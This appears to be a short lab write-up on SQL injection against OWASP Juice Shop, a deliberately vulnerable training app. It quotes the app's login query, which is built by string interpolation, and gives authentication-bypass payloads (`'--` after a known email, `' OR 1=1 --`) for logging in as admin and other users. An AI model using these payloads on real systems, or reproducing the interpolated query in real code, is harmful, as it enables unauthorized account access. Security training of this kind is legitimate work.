# Inject the juice

OWASP TOP 10 - Injection

## Practical


Source code query
https://github.com/bkimminich/juice-shop/blob/master/routes/login.js

```
`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${insecurity.hash(req.body.password || '')}' AND deletedAt IS NULL`
```

We can interfere the query by adding `'--`
```
SELECT * FROM Users WHERE email = 'valid@mail.com'--|| ''}' 

```

### Logged in as admin
![9bd9f7dae475d0810c6a20f85450b30e.png](_resources/b133ee57ece2438ab2eb4ad6f52bcc15.png)

Repeat in browser

![f6b2c6446f98c0c733add57ca32ed3b2.png](_resources/0e43f9763add41e6bbfaa473b2ae2c72.png)

### Logged in as bender

![8cccee9f852a6da6ede75e2a50618839.png](_resources/9d6d877e5e754dd7b66eac0354f2e2f8.png)


Note:
- When the username/email not known, we could use `' OR 1=1 --`
```
SELECT * FROM Users WHERE email = '' OR 1=1 --|| ''}' 
```
